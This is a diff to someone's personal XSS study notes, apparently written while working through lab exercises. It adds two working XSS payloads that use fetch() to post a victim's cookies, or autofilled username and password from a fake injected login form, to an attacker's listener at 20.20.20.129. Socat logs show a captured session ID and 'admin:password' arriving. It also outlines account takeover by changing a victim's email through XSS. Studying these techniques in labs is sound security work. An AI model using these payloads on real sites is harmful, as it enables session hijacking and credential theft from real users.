@@ -1,3 +1,20 @@
+# notes:
+- It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other
+- Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers:
+   1. Secure
+   2. HttpOnly
+- The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.
+   This protects the cookie from being sent in cleartext and captured over the network.
+- The HttpOnly flag instructs the browser to deny JavaScript access to the cookie.
+   If this flag is not set,
+      we can use an XSS payload to steal the cookie.
+---
+
+## impact
+1. cookie theft
+
+---
+
 # common JS
 ## onload event
 ```html
@@ -10,10 +27,10 @@
 ## other event handlers
 | Event Handler | Description |
 | --- | --- |
-| onclick: | Use this to invoke JavaScript upon clicking (a link, or form boxes) |
-| onload: | Use this to invoke JavaScript after the page or an image has finished loading |
+| onclick | Use this to invoke JavaScript upon clicking (a link, or form boxes) |
+| onload | Use this to invoke JavaScript after the page or an image has finished loading |
 | onmouseover | Use this to invoke JavaScript if the mouse passes by some link |
-| onmouseout | Use this to invoke JavaScript if the mouse goes pass some link |
+| onmouseout | Use this to invoke JavaScript if the mouse goes past some link |
 | onunload | Use this to invoke JavaScript right after someone leaves this page. |
 
 ---
@@ -103,3 +120,77 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 Referer: http://meta/
 ```
+## another payload to steal cookies (from portswigger labs) using POST
+```html
+<script>fetch('http://20.20.20.129', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
+```
+### output: Much cleaner :D
+```
+2022/07/27 15:47:54 socat[249716] N listening on AF=2 0.0.0.0:80
+2022/07/27 15:48:35 socat[249716] N accepting connection from AF=2 20.20.20.129:53706 on AF=2 20.20.20.129:80
+2022/07/27 15:48:35 socat[249716] N forked off child process 249964
+2022/07/27 15:48:35 socat[249716] N listening on AF=2 0.0.0.0:80
+2022/07/27 15:48:35 socat[249964] N using stdout for reading and writing
+2022/07/27 15:48:35 socat[249964] N starting data transfer loop with FDs [6,6] and [1,1]
+POST / HTTP/1.1
+Host: 20.20.20.129
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://meta/
+Content-Type: text/plain;charset=UTF-8
+Origin: http://meta
+Content-Length: 56
+Connection: close
+
+security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
+```
+
+---
+
+## XSS to steal username/password
+### payload:
+```html
+<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
+```
+anyone who views the comments will see a login form. if his browser autofills the username and password fields, they would be posted to the url included in the payload
+### output:
+```
+2022/07/27 15:58:01 socat[253401] N listening on AF=2 0.0.0.0:80
+2022/07/27 15:58:11 socat[253401] N accepting connection from AF=2 20.20.20.129:46510 on AF=2 20.20.20.129:80
+2022/07/27 15:58:11 socat[253401] N forked off child process 253456
+2022/07/27 15:58:11 socat[253401] N listening on AF=2 0.0.0.0:80
+2022/07/27 15:58:11 socat[253456] N using stdout for reading and writing
+2022/07/27 15:58:11 socat[253456] N starting data transfer loop with FDs [6,6] and [1,1]
+POST / HTTP/1.1
+Host: 20.20.20.129
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://meta/
+Content-Type: text/plain;charset=UTF-8
+Origin: http://meta
+Content-Length: 14
+Connection: close
+
+admin:password
+```
+
+---
+
+## Exploiting cross-site scripting to perform CSRF
+- *Anything a legitimate user can do on a web site,*
+   you can probably do too with XSS.
+- *Depending on the site you're targeting,*
+   you might be able to make a victim:
+   - send a message,
+   - accept a friend request,
+   - commit a backdoor to a source code repository,
+   - or transfer some Bitcoin.
+- Some websites allow logged-in users to change their email address without re-entering their password.
+   *If you've found an XSS vulnerability,*
+      you can make it trigger this functionality to:
+      change the victim's email address to one that you control,
+      and then trigger a password reset to gain access to the account. 
